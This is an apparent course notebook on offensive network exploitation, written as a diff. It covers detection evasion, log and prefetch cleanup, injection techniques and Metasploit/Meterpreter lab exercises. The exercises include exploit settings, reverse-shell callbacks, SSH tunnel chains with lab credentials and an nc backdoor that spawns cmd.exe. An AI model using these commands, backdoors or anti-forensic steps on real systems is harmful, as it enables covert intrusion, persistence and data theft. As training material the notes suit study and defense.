@@ -1,0 +1,4615 @@
+{ ``` 1. CNE Theory - NOTES ```
+ 
+``` 1.1 The Cyber Landscape  ``` {
+- anyone with limited skills can exploit
+	- trick is to stay for extended periods of time w/o detection 
+	- do not lose TTPs 
+- hacking is an art, pentesting is a science. good CNE operator combines both. 
+
+# Defenders {
+- defenders ID, motivation, challenges 
+	- overworked/underappreciated IT staff. priority != security, just system STABILITY & AVAILABILITY (bc $$$)
+	- or outsourced MSP, with IDS screen/alert analysts. not probing
+	- most WONT dig. will just delete problem, scan to confirm fixed & move on
+	- government networks = security 
+		- corporate: time->money (uptime) , govt: secrets->power (security)
+	- ^ logs reviewed = less efficiency. Centralized logging/reviewing 
+		- difficult/impossible to separate important from mundane == cracks in net to stay hidden. 
+		- they desensitize alerts which ^^^ the noise floor 
+- well defended or swiss cheese? - always can only guess 
+	- up to date OS? system patched?
+	- PSPs?
+	- free antivirus or enterprise commercial tool?
+	- bloatware vs spartan
+		^ bittorrent, IRC, itunes, winamp, yahoo msger (user workstation) 
+		or minimal
+- honeypot
+	- cannot discern good ones, other than all traffic through it is via security hole 
+	- good IDS is invisible on network 
+}
+
+# Attackers {
+- motivations? organization goals? 
+- blackhats, whitehats, greyhats
+	- freelance hacker: used by cheapos, nation states, investigators
+	- 3 roles
+		- script kiddies: 
+			- open source/cracked tools, bad methodolgoy, scan over obvious ports and set off IDS (23,80,135-139,443)
+			- use well known exploits/tools: slapper, slammer, nimda, code-red, netbus, back orifice 
+			- use ports: 666, 1337, 31337, 4444, 6666, 1234 
+			- massive typo/syntax mistakes
+		- cyber criminals
+			- phishing scams, malicious websites that exploit browsers, control bot hers 
+			- botcentric approach (cost(work) efficent)
+				- spam mail, worm, exploit other hosts, keylog, steal ID, backdoors, DDOS 
+			- typically found via malware 
+			- use of HTTP for C2
+			- likely to use: public IRC servers for C2, use open proxies/web severs to hide source (e.g. google pages)
+		- nation-state actor 
+			- unlimited $$$, ^ tech 
+			- top of line encryption RSA/AES 
+			- custom tools/exploits 
+			- 0 days 
+			- may use automated exfil facility/deaddrops on internet to funnel traffic 
+- threat groups = share tasks, coordinate targets, share tools/methodologies 
+	- pwdump / LM + NTLM hashes from SAM and AD user caches  
+	- htran // proxies conns through intermediate hops
+	- ghostrat // windows trojan 
+- between threat groups, may share TTPs and personnel 
+- hacking groups: may also work w government agencies/private corps
+- example patterns / artifacts (for attrib.)
+	- files, MD5 hashes, timestamps, custom funcs, encryption algorithms 
+	- C2 IPs, embedded domain names
+}
+
+# Dangers {
+
+# on box 
+- worms/viruses 
+- heightened potential for discovery/compromise of tools & activities -> lose access 
+- potential discovery of TTPs by other hacker 
+
+# on network 
+- botnet on net? 
+- worm loose on net?
+- hackers pillaging the net? 
+
+# at the target 
+- target has heightened sec/scrutiny bc of: 
+	- recent web defacements 
+	- discovery of another 'hacker' on system
+	- political unrest at target loc 
+	- tensions between jump point and target location 
+	- time/date and holiday schedule ! 
+
+}
+
+# Mindset {
+- access to remote tagets 
+- design new tools 
+- 2 constants Qs: 
+	"How can I break this"
+	"What can i do with this info"
+
+}
+
+# Access Methods {
+
+# Remote exploits (system/server side)
+- buffer overflow 
+- brute force/ credential masquerade 
+- much harder bc of host-based firewalls 
+
+# Client Side Attacks 
+- browsers, office software, email apps, media players 
+- malicious code waits on remote server. either wait for or elicit target to trigger an exploit 
+- instead of attacking just browser, attacks anything browser calls on 
+	- java, javasript, vbscript, flash, font rendering 
+example: XSS 
+	- insert additional iframe on webpage. points to attacker server w/malicious javascript 
+	- connects, renders, downloads and execs backdoor  
+	* send malicious scripts to user 
+	* script accesses cookies, session tokens, other SI, can even rewrite HTML content 
+example: browser plugin
+	- leverage 3rd party apps ran in browser e.g. flash, shockwave, acrobat, ActiveX, Java, QuickTime player, etc.
+	- attacker may send a trojan (e.g. evil PDF) when ran, escapes the browser and compromise PC
+example: browser session hijacking 
+	- MITM: attacker between client/server. Usually against HTTP conns. 
+	- requires server either uses self-signed certficate or compromised cert, cor client accepts 
+	a bogus or known compromised cert 
+
+# Social Engineering 
+- spear phishing 
+	- IMs, mails
+- microsoft outlook preview panel (autoexec)
+
+# Network Protocol attack 
+- IPv4, DNS, ARP 
+
+	# ARP Poison - MITM 
+	1. attacker is in LAN 
+	2. sniff net for victim MAC and gateway 
+	3. flood gateway with ARP claiming MAC of the victim AND 
+		flood victim with ARP claiming MAC of gateway 
+
+	# DNS attack - poison->redirection 
+	- prior to DNSSEC, was vuln to spoofing/hijacking 
+	- rewrite victim host file, exploit local DNS server, rewrite DNS serve entry of victim DHCP server
+		- setting up WPAD server to spof local net host names
+		- rogue DNS server that responds to DNS requests faster than real DNS server 
+	*** - create false DNS entries to redirect victim to attacker computer 
+	
+	# IPv4 Spoof 
+
+	# SNMP - think router/server enum and exploitation 
+	- early versions only had RO/RW community strings 
+	- if attacker knew or guessed com string of SNMP device, and understands Obj Identifiers (OID)
+		- could request info like: entire router config 
+		- make config changes w/o admin creds 
+
+# Watering Hole Attack 
+- strategic attack of sites org. employs are expected to access 
+- dont attack target, attack what they visit
+	- requires user cooperation (interests, proclivities, partners, business procs, geolocation) 
+- to prevent:
+		limit employee internet access 
+		monitor net traffic/DNS servers 
+		restrict or deny BYOB and connecting to networks 
+		restrict/deny data transfer
+
+# VOHO - 2012 attack on DIB, geopolitical, educational, local gov, financial sites 
+- C2 sites connected to IP address 
+- Operation Auorara/GhostNet (PLA) 
+- compromised website XSS, compromised webserver (XML core service) and oracle jav exploits 
+- BlackHole Exploit Pack
+	- attacked 32,160 visitors
+	- loaded onto 3943 systems (12%) of users 
+	- 4000 unique hosts/ 731 unique orgs 
+}
+
+}
+
+``` 1.2 Exploitation Methodology ``` {
+
+# External/ Internal Methodology {
+
+# External Methodology 
+all source collection -> net discovery -> host discovery -> port discovery -> app ID -> vuln analysis -> compromise tgt 
+
+# Internal Methodology 
+- 1. init. access/gain access
+- 2. situational awareness // search for good and evil. hacking, malware, viruses, security 
+	- who is on?
+	- who box talks to?
+	- what is its purpose? server/workstation, etc?
+	- OS, hardware, disk layout, etc
+	- what patches? apps? processes?
+	- what ports listening?
+	- where is the box?
+	# the search for good and evil. hacking, malware, viruses, security 
+	- has been previously compromised?
+	- PSPs on network/device? our presence/TTPs at risk?  
+	- LOGGING?
+- 3. escalate privileges 
+	- system/root access 
+- 4. establish persistence 
+	- install secure backdoor 
+	- 2 most common: listener (bind shell)
+		- reverse listener (beacon/ reverse shell) - good for subvert ingress firewalls
+		- stealthy outbound on common ports like 80/443 
+- 5. internal recon 
+	- search for other hosts, firewalls, routers 
+	- find: segmented networks, alternate paths 
+	- if AD, find DC or AD server (username/passwd for entire domain)
+- 6. acquire domain 
+	- dump passwd table hash, admin access to entire domain 
+	- if a second trusted domain, can pivot and access 
+- 7. conduct OPS 
+	- collect/exfil info 
+	- establish additional entrypoints into network
+		- gain access to additional internal networks 
+- 8. clean up 
+	- remove ALL evidence of actions 
+	- LOGS
+	- output/tmp files 
+	- hanging processes 
+	- core dumps 
+}
+
+# Indicator Types {
+1.	Atomic indicators cannot be broken down into smaller parts and retain their meaning in the 
+context of an intrusion. Atomic indicators include IP addresses, email addresses, and vulnerability 
+identifiers.
+
+2.	Computed indicators are derived from data involved in an incident. Computed indicators include hash 
+values and regular expressions.
+
+3.	Behavioral indicators combine computed and atomic indicators into an aggregate statement describing
+ the intrusion. The example from the reading is the statement, "the intruder initially used a backdoor 
+ which generated network traffic matching [regular expression] at the rate of [some frequency] to
+ [some IP address], and then replaced with one matching the MD5 hash [value] once access was established."
+
+
+
+} 
+
+}
+
+``` 1.3 Tradecraft ``` {
+- us vs pentest/hackers: 
+	- refinement / attention to detail. they might destroy logs, we only remove particulars 
+	- both do basic awareness/compromise/psp checks. we do indepth analysis of psp to avoid detection 
+
+# Rules of the Road {
+
+#1. Primum non nocere "first do no harm"  (PRIME directive)
+- never leave target LESS secure than found it 
+- don't patch vuln software or install defensive tools (wireshark/nmap)
+- don't intentionally disrupt a tgt network/system w/o express permission from a competent authority 
+- this is not your gaming rig 
+
+
+#2. No packets between Source and Target 
+- always use 3rd party redirectors/ jump points for anonymity 
+
+#3. Have a clue 
+- fully understand details/overarching goals of the operation plan 
+	- targets prosecuting?
+	- what intermediate points?
+	- types of triggers used to access targets?
+	- what is the goal?
+	- any items of concern with tgts, like: known PSPs to subvert OR tools/cmds to NOT run on tgts 
+	- what is recent history of operations? Ask MC/EA, read past opnotes, check NSDB
+- execute quietly 
+- know when to get HELP 
+
+#4. Log all significant actions 
+- helps analysts & future operators 
+	- depict: actions, obstacles, defensive strengths/weaknesses 
+- METHODS:
+	- automated logging of the terminal (term script)
+	- tools logs 
+	- custom tool logs 
+	- screenshots of errors/failed attempts 
+	- OPNOTES (notes & timestamps)
+		- way action performed 
+		- what led to decision 
+		- interpretation of result 
+		
+		- path to tgt
+		- method / details of conn attempt
+			- succ/fail 
+		- port numbers/triggers, major actions and results of activities on tgt 
+		- TIMESTAMPS
+			- sync with automated logs (tgt time, local time, GMT/Zulu)
+
+#5. Upload wisely - NOT warez servers
+- use single binaries to avoid notice 
+- nmap/wireshark upload === lots of noise (include multiple executables, libraries, configs) 
+
+#6. dont use untested tools on tgt system 
+- must be vetted/tested for particular target OS/service/config 
+- then added to verified toolbox 
+- read documentation, test all possible actions. understand potential conflicts 
+- e.g. tool that creates covert channel conflicts with current tgt net config. could A. lose conn to tgt and B. shut down tgt network/alert!
+- understand 32/64bit 
+	- windows: 32bit execs should work under 32bit subsystem but may create artifacts
+	- linux: most recent nix 64bit should support 32bit 
+		- still: confirm tgt has 32bit libraries installed 
+	- architectures 
+		- intel compiled tool WONT work on arm 
+		- recent multi-arch design of linux does allow reuse 
+- operator must understand underlying tech of the tools, IOCs left by tool
+	- how will tool/technique interact w/target 
+		- any files modified during exec?
+	- traffic generated?
+		- any tells of network activity upon use?
+	- artifacts left behind? 
+	
+example: psexec 
+	- pending on execution:
+		- copies a service file to remote system 
+		- enters service key into registry 
+		- creates a prefetch file, entry in app compatibility cache, login event, profile folder for remote user (if non existent) 
+	- -e -s ?
+	- psexec for powershell? 
+
+- sysinternals: sigcheck 
+	- check file metadata (timestamps, version nums, certificate chains) - great for triaging BUT 
+	- BUT initiates comms with a site at microsoft (known hash check). not a good idea 
+
+#7. Have Situational Awareness 
+- risk of compromise of TTPs 
+- understand the ENV you are in 
+	- IP addresses change, network block assignments change 
+	- operators fatfinger. ALWAYS confirm on the right target 
+- Network details 
+	- IP / hostname match expected?
+	- host in a domain? 
+	- what ports listening/ external conns?
+	- wahat firewall rules?
+	- use ARP/NDP(ipv6), route, DNS cache to identify other hosts 
+- protections on system/network?
+	- if privileged, review audit policy 
+	- process logging and powershell logging, do you use powershell modules?
+	- review proc list for sec products 
+	- any host-based sensors -> central aggregators 
+- pre-established conns to network resources?
+	- where is conn (IP/domain) from?
+	- what process is responsible for conn
+- who is logged into system? 
+	- smart admin? lazy admin? badguy?
+		- check last logged in time. see if they're just AFK
+- code reuse 
+	- if one tools is captured, could discover same code in other tools. signature base -> AV published -> burned
+
+#8. Check yoself befo u rek yoself 
+- always check ego at door, ask for help when needed 
+- asking question/looking dumb = not worth the stakes 
+
+}
+
+# Do's and Dont's {
+
+#1. DO: minimize callback (C2) volume 
+- keep traffic inside network
+	- be wary of net sensors. most are at the boundary 
+- C2 Redundancy 
+	- maintain at least 2 outbound sources 
+	- C2 interactive tier (primary) 
+	- C2 Long/Short haul tier (slow backup if primary discovered) 
+- segmented networks w/ host & net based sensors at each segment ^ security 
+
+#2. DON'T: use unencrypted channels 
+- uploading binary, issue OS command, use webshell 
+	- easily detected if in cleartext < IPS/IDS search for specific strings e.g. "C:\Windows\System32" 
+	- there are exceptions where encryption not possible:
+		initial exploitation of internal system from another system 
+		- leveraging internal systools to gain access. e.g. gain access to remote share 
+
+#3. DO: only remove YOUR entries from system logs 
+- 0 byte logs = sus unless just rolled over 
+- logs missing hours/days of logs = sus 
+- ONLY clean own entries, reset file time of last entry in log 
+
+#4. DON'T: Scan unless necessary 
+- scanning = packets = IDS alerts 
+- only scan: specific ports, protocols, IP addresses 
+- use alternatives: 
+	- ARP
+	- sniffer 
+- IF SCAN:
+	- use single IP or single port. slooow & methdoical 
+- for enum: sniffing > scanning 
+
+#5. DO: Blend in with correct port usage 
+- ephemeral ports 
+	- XP and older: 1024-4999
+	- Vita and later: 49152-65535
+	- Linux/Solaris: 32768-61000 
+- choose ports wisely e.g. communicating as XP to a Win7 
+	1034 -> 49345 
+- host based / network firewalls = limits 
+- use common ports for reaching outside assets 
+	-> 80,443,53,143,25 
+	- but ALSO affected by: firewall rules, inline proxies, available ports 
+- sussy ports to avoid
+	- 135/445 (microsoft netBIOS)
+	- 1433 (SQL and others)
+	- 6667 - IRC 
+	- 4444, 31337, 12345
+	
+#6. DONT: Use the same exfil (pivot) point against the SAME target net // redirector reuse = bad 
+- vary usage of exfil points against single tgt net 
+- have several intermediate pivots to rotate against a specific net 
+- vary the times connect to target
+
+#7. DO: Use intelligent file names, types, times
+- use NAME and FILE TIME to blend in 
+- e.g. on 64bit system, often find name32.exe 
+	- on a 32bit, wont find name64.exe. name16.exe is good. 
+- be aware of file extensions 
+	- windows tool to execute shuold be .exe ; otherwise, use a non obvious/textfile extension 
+	- linux: typically nonexistent 
+- modify MTIME to lend in
+	- why mtime? referenced default with 'dir' or 'ls -al'
+
+#8. Clean up! 
+- delete uploaded tools before exiting 
+- keylogger/pcap ran may have created a log 
+- CONSIDER:
+	- did u schedule a log in windows? delete logs
+	- did u SU in nix? delete logs 
+	- did u cause core dump/mini-dump/error log? delete files 
+	- did u create any hanging processes? kill those procs 
+	- clean Prefetch directory: windows data on recently ran programs 
+		- any tool ran on windows PROBABLY logged in prefetch*******
+
+}
+
+}
+
+``` 1.4 Shellcode, Backdoors, and Code Injection ``` {
+
+# Shellcode Notes {
+- any small piece of code that exploits software vuln 
+- typically in machine/assembly code. can exploit vulns at low level 
+
+# what to run 
+- must use the correct function call to the correct memory space - to get code to run 
+- windows: even if know function call, location can vary pending on 
+	- OS, language pack, DEP, ASLR, etc. 
+- on unix: easy
+	- place proper values in corret register/stack, beore exeuting an in 0x80 instruction (execve())
+
+# shellcode techniques 
+- Factors
+	- how want to connect?
+	- what functions?
+	- how secure is tgt?
+	- how complex is code? 
+- common shellcode funcs 
+	- find socket
+		* uses existing conn/socket with target - to spawn a shell 
+		* go through FDs matching remote conn between attacker/victim. NAT/PAT can mess this up (inbound port) 
+	- reverse shell
+		- tcp/udp external access into network. bypass loose firewall rules (outbound allow) 
+	- port binding 
+		- creates TCP/UDP listener. Used when firewall/ DMZ is no issue 
+	- command exec 
+		- need no network connection, just run command. e.g. enable service/add user 
+	- file transfer
+		- upload/download files and binaries ... upload backdoor! 
+	- multi-stage 
+		- when exploit limited to SMALL memory space.
+		1. send stub code (stager) - small programs sent w/exploit. can be persistent. 
+			- prep for and provide comms channel for stage 
+		2. stage (egg) shellcode loaded onto system by stager 
+	- syscall proxy 
+		- requires few procs and network conns 
+		- small piece of shellcode allowing access to core OS functionality 
+		- local system-like functionality from workstation 
+		- can run almost anything. hackers make library/framework that accepts normal commands, creates necessary
+		syscalls to perform 
+	- process injection 
+		- runs under context of existing (exploited) process 
+		- no new process, initially runs in memory 
+		- code never touches hard drive. hard to detect 
+		- CON: negates persistence after reboot 
+			- stub shell may need to be implanted
+			- meterpreter: process injection 
+			
+# privesc 
+	- vertical 
+		- raise it 
+	- horizontal 
+		- moving priv across or down 
+	- application example:
+		-net-use only provide info on current privilege-level account 
+		-steals token from process owned by another user, checks if any shares are listed 
+		-must switch to non-priv user to access the share 
+
+# privilege gotchas 
+- never escalate to a CRITICAL process unless you KNOW 
+	- crashing - crss or lsass: blue screen of death BSOD
+	- injecting code/ malicious DLL into process memory. could corrupt memory of process & crash machine 
+- process privileges/flags: tell proc what it can do e.g. 
+	- SEeTakeOwnershipPrivilege: proc can assume ownership of file/process
+	- without this may not be able to drop shell/load a driver 
+	* Trial and error is the only option 
+- good processes 
+	- svchost & spoolsv ( they respawn if crash ) 
+- access to user processes goes away when user logs off 
+
+# backdoor persistence 
+- examples: 
+	- batch files/init scripts 
+	- autorun keys (registry: startup, boot, login)
+	- appinit key (most procs load this when ran, used for DLL inject when user logs in)
+	- trojaned app
+	- install as permanent service 
+	- load as driver (VERY hard to detect)
+
+# code injection 
+- run code within address space of another proc 
+- methods: stack, integer, heap 
+
+# Code Inject - Concepts 
+- tgt executes your code instead of originally intended 
+- most common: shell 
+- overflows 
+	- buffer overflow 
+		- stack, heap 
+	- integer overflow 
+		- off-by-one error 
+		
+# Heap Spraying 
+- not exploit trigger 
+- payload delivery technique 
+	- blob of unallocated memory for program 
+- attacker emplaced payload somewhere in heap at predictable address 
+- attacker must find vuln program that can allocate/call heap memory/memory address of payload, and can trigger payload 
+- attacker must allocate data in memory in conrolled browser 
+- example: client-side browser
+	- implanted VBscript on webpage -> memory allocated on client -> bug triggered browser/plugin
+
+# DLL Injections 
+- gain code exec! 
+- circumvent PSP: inability to terminate/quarantine a sus running process (like svchost.exe/lsass.exe) 
+- TYPES 
+	- WINDOWS HOOKING 
+		- ask windows to call injected code whenever specific event occurs 
+		- e.g. Keylogging (every keystroke)
+		- monitoring messages, providing support for recording/macros, F1 help key, simulate mouse/keyboard input 
+		- SIMPLE to do but EASY to detect 
+	- APPINIT KEY 
+		- add/replace dlls within AppInit key. Doesn't run until User32.dll is called by new process/application
+			- google uses this so not flagged anymore 
+			- enabled by default on XP, Vista, Win7. Not Windows server 2008
+	- CreateRemoteThread FUNCTION 
+		- inject DLL into program after started 
+		- move handle to target process (CreateRemoteThread)
+		- allocate memory in process, name of DLL written to it 
+		- create new thread in target process 
+		- OS calls dll main in injected DLL 
+			- can be detected by sec setting & AV 
+	- REFLECTIVE DLL INJECTION 
+		- libary injection technique (reflective programming)
+		- DLL loader injected into process memory
+			- not registed in host process modules, no hooking, no files 
+			- downside: found via memory forensics 
+	- DLL PATH HIJACKING 
+		- DLL with same name in path of legit DLL a program looks for
+
+# Code injection countermeasures 
+- many ESPs hooki nto functions tpically used for injection 
+- provide users: offending DLL and path 
+- microsoft: uses code signing (digitally sign exectuables/scripts) - guarantee author & code is legit 
+
+}
+
+# Meterpreter {
+
+# native (command) interpreter flaws 
+- RED FLAG: creation of new process in task list (/bin/sh), attacker is visible. or if not, existing task is superseded by the new one being executed. HIDS/HIPS can also detect native environment commands.
+- CHROOT RESTRICTION: chrooted environments prevent exploited procs from referencing outside of their chrooted directory (i.e. to run command interpreter shell commands) 
+- NATIVE CMD LIMITATIONS: restricted to the native shell commands 
+
+# meterpreter improvements
+1. hidden // executes in the context of the process it exploited. HIDS/HIPS won't detect since legit proc.
+2. no chroot issue // no new spawned process 
+3. referenced in memo // meterpreter extensions/server are executed entirely from memory via Remote Library Injection 
+4. exploited process may continue to run after exploitation 
+5. incredible control/automation with writing extensions (server extensions can be written in any language that can have code distributed as a shared object (DLL) form; not limited to native commands but any commands dev can write
+- this means no need for specially purposed, position independent assembly code 
+
+# meterpreter must 
+1. not create a new process 
+2. work in chrooted environments 
+3. allow for robust flexibility
+====> in-mem lib injection && use of native shared object format  
+
+# multi-staged (1. Stager -> 2. Stage) // (1. communication channel -> 2. meterpreter payload)
+Stager - small initial payload that creates connection to victim (stager socket) then passes execution to next stage (main payload AKA meterpreter) 
+
+benefit: allows more flexibility for payload size and delivery. every exploit has limited space to carry code e.g. meterpreter DLL is 900KB; wouldn't fit any common buffer overflow. Full DLL with extensions is multi megabytes. 
+- stager facilitates this 
+
+# In-Memory lib injection vs On-Disk 
+In-Memory injection hooks the underlying file operations that the dynamic loader uses to load a library. The hooks will emulate file operations of a memory range instead of referencing a file on the disk
+
+# Reflective DLL injection 
+DLL loader is injected into process memory;
+
+implements a minimal Portable Executable (PE) file loader. Can then govern (with minimal interaction with host system and process) how it will load and interact with the host
+- extensions (DLL files) are loaded into memory on the fly as needed, smaller footprint
+- harder to detect forensically 
+	# Requirements 
+	1. the library you wish to inject must be written into the address space of the target process (host process)
+	2. the library must be loaded into that host process in such a way that the library's run time expectations are met, such as resolving its imports or relocating it to a suitable location in memory.
+
+``` Injection works from Windows NT4 up to and including Windows 8, running on x86, x64, and ARM where applicable ``` 
+
+}
+
+}
+
+}
+
+{ ``` 2. CNE Techniques ``` 
+
+``` 2.1 Metasploit ``` {
+
+# General Notes {
+- msf4 dir = general dir for history, error log, loot acquired, personal modules and plugins
+
+cd /usr/share/metasploit-framework 
+
+# setup 
+msfconsole 
+spool /root/mylog # log all output to a file. including local commands (e.g. ping, ifconfig) 
+
+search -h # view seach criteria 
+search type:exploit platform: windows name:Microsoft app:server
+
+}
+
+# session management {
+
+# send session to background 
+background 
+
+# view avail. active sessions 
+sessions -l
+
+# interact w/session 
+sessions -i 1
+
+# kill session
+sessions -k 1
+}
+
+# Meterpreter notes {
+- note: MUST use \\ or / to change windows dirs 
+	cd c:\\windows\\temp
+- meterpreter shells != stable, break easily. May lock up.
+		shell # spawn more stable shell if necessary. now in tgt context, not meterpreter context
+
+
+# commands {
+sysinfo
+ipconfig
+localtime
+
+# upload & execute 
+run uploadexec -e /root/tool2run.exe -r -v 
+	// upload and execute, and removes binary, prints stdout
+	# by default, uploads to system's TEMP/tmp directory (e.g. C:\Windows\Temp\svhost78.exe)
+		- always confirm file is deleted 
+
+``` make a backup (second shell!) ```
+run duplicate -D -P 364 -p 443 -r 192.168.137.152 
+
+# system vars (can identify system temp dir )
+get_env
+	
+}
+
+
+}
+
+# Meterpreter EXERCISE {
+ops: 192.168.11.15 
+-> e10m5.ops.local / 192.168.11.25 (T1) 
+
+#1. msfconsole -n
+disable database support 
+
+#3. view local time  
+localtime 
+
+#5. emergency shell 
+getpid  # determine your PID 
+ps # determine potential PIDs for new shell 
+	- pick PID running as SYSTEM but wont crash tgt (think spoolsv.exe / svchost.exe) 
+run post/windows/manage/multi_meterpreter_inject IPLIST="your IP address" LPORT=3333 SESSION=1 HANDLER=true PIDLIST="PID of SYSTEM owned process"
+run post/windows/manage/multi_meterpreter_inject IPLIST=192.168.11.15 LPORT=3333 SESSION=1 HANDLER=true PIDLIST=1460
+	post/windows/manage/payload_inject # similar to above module 
+
+#6. meterpreter survey 
+getuid # view priv level 
+sysinfo  # hostname, OS/service pack, arch, lang 
+ipconfig # nics, ips 
+route 
+ps
+netstat
+	run multicommand -cl 'cmd /c netstat -ano | findstr /v "PID of dns.exe"'. # if domain/DNS server
+idletime # active user check 
+getproxy # internet proxy check
+
+- confirm:
+	- have SYSTEM privileges
+	- exploited correct host/IP/tgt
+	- no malware/PSP 
+	- no anomolous connections/listening ports
+	
+#7. scripts {
+
+# env vars 
+run post/multi/gather/env
+
+# all installed apps 
+run post/windows/gather/enum_applications
+
+# active user SIDs 
+run post/windows/gather/enum_logged_on_users
+
+# event log names and num of records 
+run event_manager -i
+	// psloglist.exe still preferred for digging into individual logs (sorting/filtering)
+}
+
+#8. multicommand/shell add. survey 
+run multicommand -cl 'at','schtasks /query','net users','net accounts'
+run multicommand -cl 'netsh firewall show config'
+run multicommand -cl 'netsh advfirewall show currentprofile'
+run multicommand -cl 'cmd /c dir c:\windows\temp /od /tw'
+run post/windows/gather/wmic_command COMMAND='startup list' 
+	``` do not use native wmic, will loop/HANG shell```
+
+#9. check for exploit logs (529/680)
+upload /root/psloglist.exe c:/windows/temp/wsupdt.exe
+cd c:\\windows\\temp
+run multicommand -cl 'cmd /c wsupdt.exe -h /accepteula'
+run multicommand -cl 'cmd /c wsupdt.exe -i 529 -h 1 SECURITY'
+	# if Workstation name == random string (not current station), IS related to expliot
+run multicommand -cl 'cmd /c wsupdt.exe -i 680 -h 1 SECURITY'
+del wsupdt.exe  # clean it 
+
+#10. drop a cmd shell, determine any assigned DNS server
+shell
+netsh interface ip show config 
+exit
+
+#11. pull logfile via meterpreter shell 
+cd c:\\windows 
+download "pfirewall.log" "/root/pfirewall.log"
+
+#12. Reg key query (remember can only view users keys, e.g. SYSTEM doesnt see user keys)
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\run'
+reg queryval -k 'HKLM\software\microsoft\windows\currentversion\run' -v some-key-name-under-run
+
+	#!!! MUST change to context of user (migrate?)
+reg enumkey -k 'HKCU\software\microsoft\windows\currentversion\internet settings'
+reg queryval -k 'HKCU\software\microsoft\windows\currentversion\internet settings' -v ProxyEnable and reg queryval -k 'HKCU\software\microsoft\windows\currentversion\internet settings' -v ProxyServer
+
+#13. run program in background - fpipe . ideal replacement to start /b or batch script 
+upload /root/fpipe32b.exe c:\\windows\\temp 
+	# this uploads to cwd unless otherwise specified 
+cd c:\\windows\\temp 
+execute -f fpipe32b.exe -a '-l 12345 -r 45678 192.168.11.26'
+
+#14. search 
+search -d c:\\ -f *.txt  
+	-f = glob 
+	
+	# typical user storage locs 
+		c:\\users\document 
+			downloads, desktop 
+			drive:sharename\foldername\file.txt/pdf/doc
+
+#14.5 cleanup 
+cd c:\\windows\\prefetch 
+	cd c:/windows/prefetch 
+pwd 
+run multicommand -cl 'cmd /c dir /A /od /tw' # (list all files by write time, sorted oldest to newest)
+rm <filename>.pf" # (delete relevant files related to your activities during this session)
+	
+exit 
+
+#15. kill sessions 
+sessions -l 
+sessions -k <ses-num>
+} 
+
+# Exam {
+-> uchet.drytortugas.lab (IP: 192.0.2.72) / T1
+
+msfconsole -n
+spool /root/metlog
+
+bcaa_bof exploit 
+set payload windows/meterpreter/reverse_https 
+	- callback -> 198.51.100.113 p443 
+		set LHOST
+		set LPORT
+	- if 'failed to load client portion of stdapi, run 'load stdapi'
+
+# post exploit survey {
+localtime 
+getpid 
+getuid
+ps
+run post/windows/manage/multi_meterpreter_inject IPLIST=198.51.100.113 LPORT=8443 SESSION=1 HANDLER=true
+	sessions -i 2 
+	getpid
+	background 
+cd c:/windows/temp 
+dir 
+pwd
+ipconfig 
+sysinfo
+netstat
+	run multicommand -cl 'cmd /c netstat -ano | findstr /v "PID of dns.exe"'. # if DC (dns) server
+run multicommand -cl 'netsh advfirewall show currentprofile'
+run multicommand -cl 'netsh firewall show config'
+run post/multi/gather/env
+run multicommand -cl 'schtasks /query'
+run post/windows/gather/wmic_command COMMAND='startup list' 
+
+run multicommand -cl 'cmd /c psloglist.exe -m 30 logname' 
+	run multicommand -cl 'wevtutil qe Security /rd:true /f:text /c:1 /q:"*[System[TimeCreated[timediff(@SystemTime) <= 1800000]]]"' # these dont count
+	run multicommand -cl 'wevtutil qe System /rd:true /f:text /c:1 /q:"*[System[TimeCreated[timediff(@SystemTime) <= 1800000]]]"'
+	run multicommand -cl 'wevtutil qe Application /rd:true /f:text /c:1 /q:"*[System[TimeCreated[timediff(@SystemTime) <= 1800000]]]"'
+
+
+search -d c:\\users -f *.doc
+search -d 'c:\ProgramData\Microsoft\Windows Defender' -f *.log
+download 'c:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\History.Log' /tmp
+download 'c:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\Unknown.Log' /tmp
+
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\run'
+reg queryval -k 'HKLM\software\microsoft\windows defender\spynet' -v spynetreporting
+
+getproxy 
+	``` ^^^ totally forgot option ``` 
+
+cd c:/windows/prefetch 
+run multicommand -cl 'cmd /c dir /A /od /tw'
+}
+
+}
+
+}
+
+``` 2.2 Exploitation Through Tunnels ``` {
+
+# Exercise 1. Exploitation with a Call Forward: {
+Ops Box: 1337h4x.ops.local
+> Jump 1: linux.ramrod.lab (EXT IP: 100.64.36.17), access via SSH port 2222, Creds: mohunt / nancy123?
+>> Redirector: web.drytortugas.lab (EXT IP: 192.0.2.80, INT IP: 172.17.10.80), access via SSH port 22, Creds: www / Webific@ti0n
+>>> Target 1: w2k8-victim.drytortugas.lab (IP: 192.168.0.10), access via ms09_50_smb2_negotiate_func_index exploit, with a call forward payload
+>>>> Target 2: win7-victim.drytortugas.lab (IP: 192.168.0.11), access via pre-implanted meterpreter backdoor on port 55555
+
+# Actions {
+
+ssh -p2222 mohunt@100.64.36.17 -L:9990:192.0.2.80:22
+nancy123?
+
+ssh -p9990 www@127.0.0.1 -L4445:192.168.0.10:445 -L54321:192.168.0.10:54321 # LPF for exploit port and bind port
+Webific@ti0n
+
+# exploit config {
+msfconsole -qn 
+use exploit/windows/smb/ms09_050_smb2_negotiate_func_index 
+set RHOSTS 127.0.0.1 
+set RPORT 4445 
+set payload windows/meterpreter/bind_tcp
+set LPORT 54321
+# bc BIND, ensure Metasploit does not attempt to connect to the payload.
+set DisablePayloadHandler true
+
+}
+
+# multi handler config {
+use exploit/multi/handler
+set payload windows/meterpreter/bind_tcp
+set LPORT 54321 
+set RHOST 127.0.0.1 
+
+}
+
+# path to T2 {
+
+# portfwd to T2 
+portfwd add -L 127.0.0.1 -l 9992 -r 192.168.0.11 -p 55555
+# use exploit/multi/hanlder 
+set payload windows/meterpreter/bind_tcp
+set LPORT 9992 
+set RHOST 127.0.0.1 
+
+}
+
+}
+
+
+
+}
+
+# trigger notes {
+
+# triggering implant rules:
+1. forward/reverse tunnels depend on implant type
+	calling forward to implant = forward tunnel 
+	implant calling back = reverse tunnel 
+2. know when creating a new conn or reusing an existing one 
+	- triggering: 1 LPF to trigger, 1 RPF for callback 
+	- connected to bind backdoor: 2 LPFs 
+
+# simple nc backdoor trigger {
+
+# 'implant'
+for /F %%i in ('nc -l -p 22') do set KEY=%%i if %KEY% equ 2718281828 nc -l -p 43 -e cmd.exe 
+	--- for data sent to p22, if matches 2718281828, create listener backdoor on p43
+
+# the trigger 
+1. set up tunnel to tgt 
+	ssh -p 2222 root@100.64.36.17 -L1822:198.18.30.12:22 -L 18443:198.18.30.12:443
